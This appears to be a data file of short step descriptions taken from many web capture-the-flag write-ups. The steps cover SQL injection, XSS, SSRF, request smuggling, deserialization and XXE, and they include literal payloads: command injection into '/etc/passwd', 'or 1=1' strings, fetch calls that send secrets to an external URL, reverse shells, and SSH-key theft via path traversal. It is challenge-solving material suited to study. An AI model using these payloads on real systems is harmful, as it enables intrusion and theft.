    "Apply the determined attack vector to exploit the system, overriding the prototype using a payload to set a context to the prototype of [object] and redefining 'key' through '__defineSetter__' and '__defineGetter__'.",
    "An error page popped up, accessed Symfony profiler interface",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd' to list the contents of '/etc/passwd'.",
    "Craft a POST request to target this vulnerability and include /var/www/html/flag.php",
    "Perform a GET request to the discovered endpoint",
    "Cycled between accounts due to 1 minute delay in database reset on new site",
    "Send a GET request with the correct 'Authorization' header using the new token to authenticate.",
    "Decode the field First-Flag to extract the first flag",
    "Upon promise resolution, used 'fetch' function to send the response text (containing the secrets) to an external URL",
    "Identify ability to control 'astProgram.type' variable which sets the type attribute for the script element",
    "This means the File Descriptor (FD) for connection to MySQL server is open before executing shellcode, so SQL queries can be sent to it and get the response read",
    "The `file://` protocol was not explicitly banned, making the encryption possible.",
    "Managed to control $whoareyou variable and passed through conditions checking for specific value comparisons",
    "Launched the attack script on the new GitHub Pages site and observed the attack working even with Chrome's cache partitioning policy",
    "Implemented a condition in the Python script to retrieve cookies from the target page",
    "Read the page carefully until reaching the line at the bottom.",
    "Utilized 'first' and 'last' to get the first and last items of a list; Converted items in a dictionary to a list using 'list'",
    "With the obtained encryption key, it was possible to manipulate the file:// protocol to access otherwise forbidden files.",
    "Capture the flag from the server response",
    "We can set a breakpoint after the `malloc` call and before the `strcpy` call. `$var8` is set immediately after `call $dlmalloc` - this would be the pointer to the newly allocated memory where the payload will be stored.",
    "Used the 2FA token on an authenticator application to generate the admin 2FA codes",
    "Incorporated the token identified in the Javascript files into the POST request",
    "Connect to the website and check the cookies being set",
    "Discovered another way to solve the challenge for the second flag by injecting '\\debug\\answer' as the host in a curl request.",
    "Sent this XSS payload through the data endpoint",
    "Discovered that the 'mock()' function is a wrapper function that runs the function exposed by the WASM module.",
    "Fired up BurpSuite and sent the request with the cookie to the intruder.",
    "Tested the theory by sending a POST request to the '/localization-language' endpoint with the JSON data where 'language' is set to 'key'",
    "Retrieve the flag from the decrypted image",
    "Observe the result and notice that it validates the possibility of arbitrary code execution",
    "Using the navigation factor, performed an XS leak attack to verify if a substring exists in the flag",
    "Ran 'bzr check' command which triggered an error revealing the missing files.",
    "Examined the login form on 'login.php' and noticed 'email' and 'pass' fields which are vulnerable to an SQL injection attack.",
    "On attacker-controlled site, host custom script as 'assets/js/bootstrap.js'",
    "Command execution triggered execution of the flag_dispenser to get the flag.",
    "Run 'python3 payload.py | nc localhost 8000' to capture the request",
    "Crafted a payload using 'GET / HTTP/1.1' and the 'Content-Length' and 'Transfer-Encoding' headers",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Inspect the given source code and identify the '/guest' endpoint which deserializes the base 64 decoded 'guest' cookie",
    "Plan to execute a reverse shell payload within the function that would be fired when the data is deserialized",
    "Analyzed the source code which indicates that for testing locally, `admin:admin` is the basic authentication credentials",
    "Read the blog post in the home page of the challenge URL",
    "Executed a POST request with an overflowing 'Content-Length' header and a second 'Content-Length' header with a value of 26",
    "Craft a malicious serialized class with escalated privileges",
    "Post each successful guess to the exploit server.",
    "Scanned the entire subnet from 172.16.2.0 to 172.16.2.255 using Burp Suite Intruder, with 'X-Forwarded-For' set to every IP in that range.",
    "Use the Python subprocess library's getoutput() function to craft a payload to return the content of /flag/flag.txt",
    "Preserve the original admin's ID by setting the Path of the custom cookie to /get which allows to use the original admin ID in the /find endpoint.",
    "Examined the application's server code and noticed that the JWT token is checked in the response for '/localisation-file'",
    "/home/user & cat /home/user/flag.txt",
    "Accessed site at :7777",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "Noticed the login occurs only if the user's IP address is one of the whitelisted IP addresses or when the debug mode is enabled. Found that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address",
    "Accessed a new webpage 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce'",
    "Accessed the website provided in the challenge",
    "Inspected the 'git log' to view all previous commits in the repository",
    "Introduced three separate payloads in the HTML to obtain more information on the browsing context: one to get the full URL of the browsing context, another to get the page contents, and the third to get readable cookies.",
    "Ran the exploit with the phar file as './laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar'",
    "Build a token of HS256 with secret_key 'redraider' and value of user as admin",
    "Decided to exploit this point by making an educated guess on the numbers at the beginning of the MD5 string",
    "Tested payloads from the unit test in the challenge, the third payload ended up triggering an alert, indicating a successful XSS attack",
    "Started the challenge by finding the /login/ endpoint and a www.zip file using dirsearch",
    "To find the session cookie, set the session's 'admin' field to 'true' and run a script with the site's 'secret key' included",
    "Imported 'io/ioutil' and 'os';",
    "Upon promise resolution, used 'fetch' function to send the response text (containing the new 2FA token) to an external URL",
    "Observed that the uploaded file triggers a POST to /upload.php and then redirects with 302 Found to the /index.php, with the file content displayed",
    "Accessed the website and observed allowed actions: upload and comment on dog pictures",
    "Identified a dangerous `unserialize()` function used in the index route that decodes a user's cookie",
    "Notes that due to the server filtering the character '.', the script is encoded into base64 to bypass this filtering.",
    "Identified a suspicious commit with a message 'oops', indicating the possibility of useful information in previous commits",
    "Identify two cookies in the system: JWT 'identity'=31337' and 'JWT 'secret'='dawgCTF?heckin#bamboozle'",
    "Identify LibreOffice as the tool being used for document conversions on the server",
    "Visited 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Find that the service functions similarly to Pastebin, allowing the creation and sharing of messages",
    "Understood that the password was split into various parts and stored against assigned keys",
    "Used DOM Clobbering technique to redefine `window.callback` and `trustedTypes`",
    "Notice that 'require()' call doesn't pass any arguments in 'changelog.js' so 'process.argv[2]' is undefined.",
    "Observed a column 'R34L_F14G' in the 'users_data' database, but it is returning blank results.",
    "Observe the flag utflag{n3xt_y3ar_go1ng_bl1nd} found in the returned data",
    "Found the flag.",
    "Realized it might be possible to force the admin bot to perform a search function on the server, checking if a given fragment identifier substring is part of the flag",
    "The Python script made GET requests, changing the cookie flag each time, until a termination condition 'EOF' is met",
    "Initiated a brute-force attack on the prefix using a Python script that combines portions of the failed and successful purchase data strings and makes HTTP GET requests to the provided URL.",
    "Input the SQL injection payload in the 'username' and 'password' fields as `username=admin&password=' or '1`",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called, due to the SUID flag being set",
    "Access and inspect the front-end JavaScript source code",
    "Concluded that the directory function then receives an array with a single string 'flag' as an argument, which by the function's design returns the value of the 'flag' environment variable",
    "Understood the purpose of the attack is an image only displayed when the bot accesses the site",
    "Created a UNION SQL operation with 'null' in order to determine the user table and the number of columns that need to be unioned.",
    "Viewed the admin's cookie and 'X-Access' headers in the log file",
    "Identified that the JavaScript check was being used to prevent the submission of long passwords",
    "The script was set to continue downloading missing files until no more missing files were detected.",
    "Typed the correct pin and pressed enter which returned the flag",
    "Analyze the source code within 'play.php'",
    "Check if the Header 'x-captcha-state' is set.",
    "Access the provided URL for the decryption service and note the UUID prefix '9e5a' mentioned in the challenge description",
    "Press `Ctrl + U` on your browser to view the source code of the HTML file.",
    "Understood the goal to read the 'flag.txt' file that requires root access, meaning a shell needs to be spawned as root",
    "Takes note of the directory contents returned by the server.",
    "Look at the GitHub Actions file 'build_flag_checker.yml' in the '.github/workflows' directory",
    "Found alternative solution posted by P4Team, which used distinct virtual hosts and shell wildcards for the same result",
    "Passed the obtained string as an argument to '/readflag' using character substitution, which resulted in 'Wrong Password!' message.",
    "Created 'first.pdf' and 'second.pdf' using the chosen input PDFs.",
    "Connect to the website at http://10.255.0.1:8010/",
    "Identify the disallowed path '/g00d_old_mus1c.php' in the 'robots.txt' file",
    "Accessed the new URL 'https://freewifi.ctf.umbccd.io/staff.html' and found the flag",
    "Assume that these input fields are not properly sanitizing special characters and attempt SQL injection",
    "Understand that by carefully crafting the input for the 'username', you can close the double-quote allowing you to manipulate the following fields in the token.",
    "Construct a command that runs the base64-encoded payload through decoding on the server, understood by the server as a Python command.",
    "For the attack, a Python script is used to generate the corresponding CSS, and the result is saved in 'exploit.css'.",
    "Discovered that Apache2 is very restrictive towards parsing the HTTP request.",
    "Exploited the vulnerability to access unauthorized data or perform unauthorized actions",
    "Find a flag.txt file in the /home directory",
    "Invoked the Lambda function to gain a reverse shell",
    "Found a JavaScript event in the onclick attribute which returned an encoded string",
    "Used SQL Injection to read all posts from 'posts'; discovered from 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Found over 1900 logs through this method",
    "Used 'login.php.bak' to view PHP source code",
    "Recognized the ability to 'preview' HTML without saving it in this challenge. The HTML input however is sanitized through DOMPurify.",
    "Decide to use Import Maps to switch 'astToJs' to 'evalCode'",
    "The public key was found to be encoded in the JWT.",
    "Checked the robots.txt file of the website and found the '/flag' endpoint",
    "Discovered that the server generates a JWT token with the 'language' field set according to the parameter passed via the POST handler for '/localization-language'",
    "Double decoded the user cookie",
    "Run the written JavaScript",
    "Received a jwt token as response",
    "Identify that the application verifies the token and then forwards it to `decrypter` function which calls the `unserialize` function, which can provide Remote Code Execution (RCE)",
    "Saved the request and used sqlmap to brute force the password and obtain the token",
    "Searched the leaked contents of the admin page to find the flag",
    "Realized that the two-fetch mechanism could be exploited with two different responses.",
    "Accessed the target website, which was a login form",
    "Attempt to inject a template operation (7*7) to confirm the SSTI vulnerability",
    "Found that the 'users' table had 3 columns and the second column contained the usernames",
    "Web server is vulnerable to CVE-2022-26377, enabling Request Smuggling to send AJP Requests",
    "Given that LaTeX is turing-complete and can read files, attempt to read the required file but note that strings including the '/' symbol have been blacklisted.",
    "Visit the GitHub URL, which leads to a list of website admin usernames.",
    "Fail to restore source code due to missing git objects",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "First, trying to inject a random '<h1>Hello</h1>' tag to check for HTML input acceptance",
    "Opened http://easy-php.darkarmy.xyz/?lmao which revealed the site's PHP code",
    "Write a Python script to discover the token by generating payloads with the SQL query to extract each character of the token",
    "Followed the challenge description and noted the use of the 'flask_caching' module for the app",
    "Use the remote command execution vulnerability to list directories in the root location",
    "Noting that an image is necessary to exploit the service because the 'Content-Type' is strictly checked and some extensions, namely, '.jpg', '.png', and '.gif', are blacklisted in the header-setting function.",
    "After logging in, retrieve the flag 'TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll}' from the site.",
    "Leveraged the above-mentioned Remote Code Execution (RCE) vulnerability aiming to gain access to the system",
    "Found the code in 'view.php' to check the password and retrieve a note.",
    "At this point, using the gained reverse shell to view the source code of the program",
    "Exploited SSRF to gain access to NFS filesystem",
    "Discover all the exposed Meteor methods including 'notes.count', 'notes.add', and 'notes.remove'",
    "Started the CTF Challenge in Houseplant CTF 2020 \u2013 Fire/place which fell under the web category and was worth 1783 points",
    "Identified admin credentials and passcode from the accessed user database and passcode files.",
    "Identified that the website was vulnerable to SQL injection",
    "Noticed DOMPurify is applied on HTML, but acknowledged that DOMPurify is pretty secure, and it's unlikely they want me to find a vulnerability in it",
    "Connected to target IP:33337 which redirected to domain name threeofhearts.ctf.net",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Set up a `ngrok` TCP forwarder and modified the RCE to trigger a reverse shell",
    "Find that content of the note is reflected in the source code and inserted into the HTML",
    "Get the flag by ensuring that `$to_check` is `0` to exploit PHP using loose comparison",
    "Devise a workaround by defining XML entities to form the string 'text'",
    "Identified that the page at port 8080 is the same as the public challenge site.",
    "Recognize there's a well-known deserialization vulnerability in node.js that could lead to Remote Code Execution (RCE)",
    "Observe that the flag is revealed on the browser",
    "Analyzed the HTML source code to discover an interesting comment (?source=1)",
    "Create a crafted payload utilizing XXE to attempt reading a file from the server",
    "Accessed the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt to retrieve the flag.",
    "Inspected the static resources of the web page from the developer tools in the browser (F12 -> Sources in Google Chrome) and noticed two javascript files: 'detailsCheck.js' and 'xmlDetailsCheckPayload.js'.",
    "Found out it is achievable by making two additional GET requests: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3' and 'GET https://yeunote.ctf.yeuchimse.com/note/twitter?oauth_token=<oauth token>&oauth_verifier=<oauth verifier>'.",
    "Identified the website was under HTTPS, but the certificate seemed invalid",
    "In the loop, the 'payload' is created in the format of a SQL statement with an OR operator to guess the next character in the password",
    "Notice that a normal interaction involves passing a productId value, which the server reflects in the response",
    "Reviewed JavaScript 'index.js' to understand the methods used for voting.",
    "Attempted to upload a .php file to run arbitrary PHP code",
    "Craft a SQL query to extract the data from the different IP address",
    "Access the challenge URL: http://chals.ctf.sg:40401",
    "Observe that JavaScript inside the uploaded HTML does execute, even if not when directly input into the application's fields",
    "Retrieve the flag from the content of the flag.txt file",
    "Inside the new HTML script element, add an 'imports' key to map '/js/ast-to-js.mjs' to '/js/eval-code.mjs'",
    "Recognize that the 'valid_ip' function restricts usage of 0, 10, 127, certain ranges of 172, 169, and 192 IPs which includes the localhost (127.0.0.1)",
    "Injected CSS through the input box, guessing combinations of characters until the entire password was revealed",
    "Identified a loophole where the 'search' feature originally using 'this.noteData' could be bypassed since 'this.noteData' remained the same even after sanitizing HTML input via 'preview' feature.",
    "It was discovered that if the subdomain is 'jsapi.tech', it points to 'sohomdatta1.github.io' thanks to a wildcard DNS configuration.",
    "Identify the hardcoded username.",
    "Check the window's 'history.length' attribute to determine if a redirect occurred.",
    "Noted that the 'doit' method is called in the '__destruct()' function if present in the '$method' attribute of the destructed object.",
    "Decided to use burpsuite to bypass the front-end input sanitization.",
    "Check the website response with this newly crafted URL",
    "Sent the specially constructed requests to the server and obtained the flag in the response of the smuggled request.",
    "Successfully gained access to the login page by setting the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Right clicked on the webpage and selected 'Inspect' or 'Inspect Element'",
    "Examine the `Login` object for exploitation.",
    "Used the shell access to browse the file system and found a folder '/ctf'",
    "Pasted the introspection data received into the graphql voyager tool to visualize the data structure",
    "Discovered a second SQL injection endpoint after fuzzing the input.",
    "Hosted a document type definition (DTD) on a personal domain for blind exfiltration of files.",
    "Discover the object injection vulnerability in the PHP application.",
    "Take notice of the 'validateUrls' mechanism which validates whether the URL begins with 'http://app', and can be bypassed by using the 'username:password@hostname' URL format",
    "Tested and confirmed the SQL injection vulnerability by entering ' or '1'='1 as the payload",
    "Determine the renamed file path of the uploaded image",
    "Understood that pipe character '|' is allowed, thus utilizing it to terminate the 'cat' command and run new command.",
    "Identified /rin that uses SSRF code. The server checks the X-Forwarded-For header to validate the client IP.",
    "Spammed 'Go' on Burp's repeater to send the request and concurrently wrote a Python script to read from '/mydank'",
    "Second change contained an Hexadecimal string within HTML comment tags.",
    "Utilized path traversal to access /etc/passwd file",
    "Registered a user to get access to the website",
    "Accessed the template files on the server and obtained their content",
    "Understand that the verify.pug template has a unescaped username allowing HTML markup injection",
    "Built URL to pass payload as parameter",
    "Examine the source code of the PHP page",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings, bypassing regex filters.",
    "Make several attempts with this setup until the flag is obtained.",
    "Checked the repository status using 'bzr status' command, revealing a removed 'index.php' file.",
    "Used the discovered mapping to smuggle a request to /admin in flagportal to perform an SSRF.",
    "Created a script to generate the JWT payload with 'language' parameter set to 'flag.txt' and the token signed using the public key",
    "Discovered the admin page at 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin' by reading the 'robots.txt' file",
    "Used 'ls' command enclosed in backticks to list the files",
    "Use this input string to perform the SQL injection and decrypt the 'flag.png.encrypted' file",
    "Assembled the identified parts of the double hexed flag to get the final flag: 343836313732363536423631374136353433353434363742333433313644354633373330354636323333354633343546333537313643333133373333354636443334333533373333373237430 which is 'HarekazeCTF{41m_70_b3_4_5ql173_m4573r|'",
    "Guessed that the flag is 'FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}'.",
    "Identify the PHP script that checks if md5 hashes of 'i1' and 'i2' are equal",
    "Determined the solution for the crossword puzzle.",
    "Understood the extensive filter used for the challenge",
    "Created a URL with the successful payload and upon submitting it, received the flag",
    "Find the admin.html page which is mentioned in Robots.txt or can be located through code inspection",
    "Examine the source code to find an 'eval' syntax used on 'warmup' GET parameter, which is strictly checked for.",
    "The website is a simple login page.",
    "Here we have a user dir and in that we have the flag.txt",
    "Connected to the challenge website",
    "Determined that the app checks the IP address in the URL against a whitelist of allowed IP ranges: 10.0.0.0/24, 10.0.42.0/24, and 10.0.43/24.",
    "Executed a GET request to read the item that was created from the request smuggling.",
    "Identify the input fields for the login function, which are 'username' and 'password'",
    "Printed the content of the index.php file using 'cat index.php' command",
    "Inside one of the files, '(wtf.mp4)', discovered the flag in reversed order.",
    "Upon setting X-Forwarded-For to 172.16.2.24, access to the login page was achieved.",
    "Examined server code and discovered `const port = process.env.PORT || 80` line, clarifying how to start the app locally using a non-privileged port",
    "Study and inspect the provided instance of a simple website with functionality including a 'flag store', create new store, update created store description, and create items in created store.",
    "Examine the /find endpoint which takes the condition, startsWith , endsWith, and debug parameters.",
    "Created a crafted 'id' parameter '5779715767432985082/../../admin'.",
    "Visited the website and analyzed the webpage's HTML and JavaScript code",
    "Recognize that XInclude directives allow the parsing of files",
    "Inspect the source code and discover that all other endpoints are protected by authenticationMiddleware",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section made the admin visit it and the 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "Identify that the `login` cookie is deserialized into a `Login` object.",
    "Used sqlmap to retrieve the 'R34L_F14G' column data from the 'users_data' table in the 'login.php' page by exploiting the secondary SQL injection vector.",
    "Unable to find flag files, it was confirmed that remote code execution (RCE) was necessary",
    "Used DOM clobbering as DOMPurify doesn't protect against it to override 'window.enable_experimental_features' property.",
    "Identified 'mec' as relating to a WordPress Plugin 'Modern events calendar' and found its webpage",
    "Used PHP filters to read source code via base64 encoding by creating another payload.",
    "Refer to a list of strings that result in these magic hashes for PHP",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Decoded the JWT token to reveal the 'username', 'uid', and 'iat'",
    "The website isn't protected by CSRF tokens but employs SameSite=Lax cookies. Hence there can't be any POST requests across different origins.",
    "Translated the hex-encoded list, var _0x575c, into a more readable format",
    "Change the location of the flag component in the XML",
    "Inspect the webpage and discover it uses XML envelopes via two JavaScript files when buttons are pressed",
    "Attempted Cross-site Scripting (XSS) attack, which failed due to the site removing <script> tags",
    "With the secret key, craft a new session cookie with the `very_auth` variable set to 'admin'. Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python to achieve this.",
    "Looking at the JavaScript file in the webpage found that the content is retrieved from the URL in base64 format and HTML tags are not allowed",
    "Examine attached server.py file and understand the requirement for three keys",
    "Changed User-Agent to 'Linux' via a curl command",
    "Identified that the request was double proxied with Apache and Nginx.",
    "Found the flag hidden in the response: 'DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}'.",
    "Reconstruct the user data from the encoded string.",
    "Connected to the database using the credentials from the JavaScript code",
    "Established the ability to enumerate usernames at `/users/<username>`, a success results in a 403 redirect to own account, failure results in 404 Not Found",
    "Immutable code inspection of upload.php helped to figure out there's an XML External Entity (XXE) vulnerability when it loads SVG files.",
    "Ensured that a valid graph could be created using a specific format",
    "Adjusted payload produced from serialization operation because of the replace operation which changed the string length.",
    "Tried changing the input field from 'password' to 'totp' but it didn't work",
    "Identify application is vulnerable to XXE and that 'author' field can be used to execute attack.",
    "Examine the /get and /add endpoints and their relationship with user's ID cookie in the Notes map.",
    "Extracted the session cookie from the response headers",
    "Connect to port 12380 using Apache httpd 2.4.49",
    "Identified potential for XSS due to unsanitized input field and unescaped output upon viewing uploaded documents",
    "Downloaded the 'dirstate' file from the 'checkout' folder and replaced the current 'dirstate' file.",
    "Form the intention to alter the decoded 'admin' value to a rot13-encoded 'true', which would require the JWT secret.",
    "Successful execution of 'id' command confirmed remote command execution vulnerability.",
    "The server responds with the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Found an interesting comment in the HTML source code: '?sauce'",
    "Tried passing a page query in the flag by visiting 'http://web.zh3r0.ml:7777/?page=flag', and received a gif in response",
    "Confirmed the first two 'if' statements would be passed because PHP would only consider the integer part of the 'id' parameter for the cast.",
    "Identify that the task is similar to the previous one but requires blind NoSQL injection",
    "Identify the flag in the meta tag: ```<meta name=\"redpwnctf2020\" content=\"flag{1nspector_g3n3ral_at_w0rk}\">```",
    "Examined the HTML source code in the admin page, found a comment hinting towards a potential vulnerability using TOTP",
    "Examined the script and found that a hint was given if cookie value did not match MD5 hash of '$cfg_pass' variable",
    "Discovered a suspicious 'data' parameter in the URL during the purchase of 'flag' and 'cheap'.",
    "Then the SQL query has to be sent to the File Descriptor (FD) 4 ( MySQL server ), then the response has to be read as it is received, and lastly, the received response has to be written to stdout",
    "Attempt to break out of the string with a single quote in '?cat=news'', but find the site prepends a backslash",
    "Observing that parentheses and some keywords were blocked, searched a way to call a function without parentheses",
    "Identified an end-point '/ping?id=' returning base64-encoded result of each ping request.",
    "Create the server script to receive the port number from the exfiltration attempt, writing the port number used to a file to keep track",
    "Identified the flag from the URL: 'OOO{did you see my dog}'",
    "Double hexed the flag to obtain a 152-digit long number that only consisted of digits",
    "Found that a status 500 is received when an apostrophe is used in either the username or password field",
    "Crafting an AJP request based on a writeup to leak the source code (index.jsp)",
    "Retrieve the flag from the response of the POST request",
    "Aimed to extract the password serving as the flag",
    "Used GROUP_CONCAT function to concatenate all retrieved column names into a single string",
    "Receive response confirming successful staging of attack.",
    "Created a payload that doesn't have dots or double slashes. This is done using data URI in the form 'data:text/html;base64,<base64 data>'.",
    "Deducing it was MySQL due to the difference in syntax for other database systems",
    "Found out that ports 8080 and 9006 were open.",
    "Used the provided bypass and attempted to mutate the element in order to bypass the sanitizer.",
    "Replaced the username with 'admin' and set the payload parameter at userID.",
    "Received form on alien_sector.php after having right PHPSESSID in cookies",
    "Found that Vitepress running in dev mode enabled CORS and opened up path traversal vulnerabilities.",
    "Identified that the webpage might not have the 'flagman69' user",
    "Abused the type attribute and sent the request 'type=/../super_secret_shell.php'",
    "Used basic SQL injection payload `1' or '1'='1` to return existing data.",
    "Deciphered that the JavaScript in the source code was obfuscated",
    "Used the 'UpdatePassword' mutation to change the admin account's password",
    "Split large image data into three parts as it exceeded the length that could be specified in the url",
    "Visited the given URL on the browser",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Tested rendering in the browser and found an error was thrown",
    "In the HTTP Response, found a redirection URL.",
    "Assess the function of the 'handlebars' library within the system as it could present an entry point if a vulnerability, such as Template Injection, can be exploited successfully.",
    "Analyze the PHP code for potential vulnerabilities. Ignored the first 'If' statement as it was determined to be irrelevant for the challenge",
    "From the PHP, realize that there\u2019s a potential path traversal vulnerability that can be exploited",
    "Used nip.io wildcard DNS service to exploit the redirection behaviour. Request to '/pleb.127.0.0.1.nip.io' returned localhost.",
    "Attempted to utilize CSRF mechanism to gain admin access.",
    "Realized SSRF couldn't be exploited directly due to validation that prevents from specifying 'localhost' or '127.0.0.1'",
    "Attempted a command injection via the cookie to generate more base64 cookies",
    "Noticed 'frequency' increments with each page refresh",
    "Discovered a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "Reviewed the site's JavaScript and understood that the 'demo()' function is called on the 'demo' GET request parameter. This results in the setting of the innerHTML of the 'result' element.",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard; /login and /forgotpassword.html were especially interesting",
    "Uploaded the .htaccess file",
    "Forming the MySQL query following the MySQL docs under the protocol level results in the following: little-endian, 4 bytes, the length of the written query, a 1-byte query type (0x3 for this query), followed by the query itself",
    "Configured and started the burpsuite tool to intercept data between the server and the client.",
    "Submitted a series of CSS selectors for all potential starting letters of the password, one at a time, to identify the starting letter",
    "Nineth step: Utilized script to make the client request to exploit the limit of 20 redirects using Fetch API.",
    "Access the provided URL: http://highsource.tuctf.com/",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Analyzed the browser console and found an error 'jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {'",
    "Constructed a payload to test the exploit.",
    "Identified that `ejs` is used as a library for templating in web applications",
    "Retrieved the flag at `/flag.txt`",
    "Investigate changes made in the 'Fix auth!!!' commit; find that the 'auth' cookie was previously set in 'gethash.sh'",
    "Searched for a way to embed an image into a mermaid flowchart",
    "Used 'shell' as the setting name in the POST request to set 'shell=true' for all objects",
    "Examine the file UserController.java in the 'controllers' directory to discover useful endpoints.",
    "Discovered that instead of 'gopher://' protocol, 'inctf://' had to be used",
    "Find and examine feedback form on website.",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Started with network scan using Nmap",
    "Use the identified class to read and display file content, specifically 'flag.txt'",
    "Given a company website for the CTF challenge",
    "Confirmed the existence of an additional table holding the flag",
    "Establish a session with Shiba website through command session.get('https://shiba.yactf.ru/')",
    "Set debug parameter to TRUE and noted SQL errors",
    "Automate the full exploit chain in solve.py",
    "Intended to load the '/static/js/marked.min.js' files from a different URL to exploit the script tags being part of the original template.",
    "Explored the non-admin path, /sakura that allows interaction with the Redis cache. But the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Copy the JWT token and decode it using a website such as jwt.io to obtain a 'userId', in this case observed to be '1'.",
    "A user-controlled 'uri' is appended to the backend URL with Python's urllib.parse.urljoin",
    "Research led to the discovery of a CVE for `md-to-pdf` and a payload that could potentially exploit this vulnerability",
    "Created a phar that when unserialized, it created an Image object with a controlled filename which would execute the command './flag_dispenser' when the __destruct method was called.",
    "Opened browser dev tools and observed the local storage",
    "Apply brainstorming and logic to explore using commas as input",
    "Script appends 'img' element to the document body",
    "Used the path traversal to get the SSH key from 'http://website/../../../../../home/stypr/.ssh/id_rsa'.",
    "Identify a bug in the API where the index page is unauthenticated.",
    "Identify the source code of the web application with registration, login, and readfile functionalities",
    "Identify the use of base64-encoded payloads as a potential workaround this blacklist.",
    "Realized password was the flag, thus decided to use the SQL LIKE clause to discover each character of the password one at a time",
    "Test your payload to make sure it works",
    "Located the 'admin' page and '.git' directory via robots.",
    "Executed the Python script to solve the challenge using the command: python3 -m flask run",
    "Upload the 'modified.odt' file containing the payload to the server",
    "Used the JWT secret to create a JWT with the admin role using https://jwt.io/ or a JWT-signing library.",
    "Eleventh step: Tested this method to successfully bruteforce the flag letter by letter.",
    "The challenge hints at memory issues",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected, leading to an alert in the browser, indicating a Cross-Site Scripting (XSS) vulnerability",
    "An observation made was that the web application is likely to be vulnerable to SQL injection.",
    "Research about the versions of Node.js and ATS used",
    "Replaced the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Identify a second javascript file that sends the XML envelope and reads the answer",
    "Guessed that this was a command injection challenge and tried accessing 'http://IP:PORT/?command=ls' to see if could list the contents of the current directory. This confirmed that it was indeed a command injection challenge.",
    "Worked on bypassing '{{' and '}}' by using an if-else statement",
    "Index.jsp reveals that a specific IP address (119.29.29.29) response triggers display of the system environment flag",
    "Identified the login process in the file bookhub/forms.user.py",
    "Note how the authentication fails if the `bind_param()` call returns false.",
    "Investigate the source code provided to understand how the application works and what you need to exploit. Find that the '/display' page checks the session cookie which has a `very_auth` session variable which needs to be set to `admin`.",
    "Visit the '/admin' route, monitoring the response for headers requiring a token.",
    "Identify the goal: Bypass a WAF (Web Application Firewall), with the IP address being checked using the ipaddress library in Python.",
    "Joined the two parts of the flag to form 'accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}'",
    "Checked the robots.txt on the site to examine the source.zip that reveals all the source code.",
    "Analyzed the source code of the app provided in the challenge",
    "Performed basic web enumeration to identify the presence of a Git repository in the target URL (http://meme-stash.darkarmy.xyz/)",
    "Analyzed the HTML source of the page to find any hidden or obscured data.",
    "Familiarize with TranslateBBCode routine in bbcode.asm file part of FreshLib, which processes BBCode tags",
    "Unzip 'src.zip' and inspect its contents, focusing on the 'decrypt.php' file which suggests the potential for an SQL injection via the UUID POST data",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running, which could lead to unreplaced `<` and `>` characters provided the function was not called.",
    "Confirmed the presence of blind SQL injection by using a payload of ' or sleep(2) and 1=1#",
    "Search for a string formatted like this: `flag{...}` in the HTML source code.",
    "Noticed when accessing '/q' endpoint, the application displayed contents of '/api/answer'. This was done server-side",
    "The web application was then identified to be using 'ejs', known to be capable of Remote Code Execution (RCE) by prototype pollution.",
    "Understood that for a POST request, a 'Requests_On_Steroids' function is used to fetch the URL and if the value of <userID>_isAdmin key in Redis database is 'yes', the flag was shown in the response",
    "Identified a vulnerability in the 'new chat' feature",
    "Weird error appears when URL https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23 is used, hinting that XML is being read from a database.",
    "Automated the process using a Python script that sends a post request with the payload for every possible character in the flag. Whenever a correct character is found (indicated by a read timeout due to the 5 seconds delay), the character is appended to the flag and the script moves to the next character",
    "Intercepted the request and set the 'Host' header manually to threeofhearts.ctf.net using a browser.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "View the source code of cookie.php",
    "An attempt is made to login using 'user' username and 'user' password, resulting in a visible SQL query for the login request",
    "Added a special character (') to the end of the username, causing an SQL error",
    "Discovered from the python code that there is a debugging private key for testing: '8EE86735658A9CE426EAF4E26BB0450E', which is the MD5 of the string: 'fuckingdog'.",
